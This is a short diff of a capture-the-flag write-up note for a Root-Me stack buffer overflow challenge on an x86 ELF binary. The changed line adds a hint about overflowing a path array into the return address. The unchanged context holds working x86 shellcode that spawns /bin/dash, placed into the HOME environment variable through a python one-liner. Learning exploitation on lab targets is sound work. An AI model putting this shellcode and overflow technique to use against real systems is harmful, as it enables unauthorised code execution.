@@ -3,7 +3,7 @@
 https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-4
 
 
-Can make use of generic spawn /bin/dash shellcode and insert into start of env struct, home field.
+Can make use of generic spawn /bin/dash shellcode and insert into start of env struct, the home array.  Overflow the path array into RET address.
 
     export HOME=$(python -c 'print "\xeb\x1d\x5b\x31\xd2\x89\xd9\x83\xc1\x04\x83\xc1\x05\x88\x11\x31\xc0\xb0\x0b\x31\xc9\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xde\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41"')
 
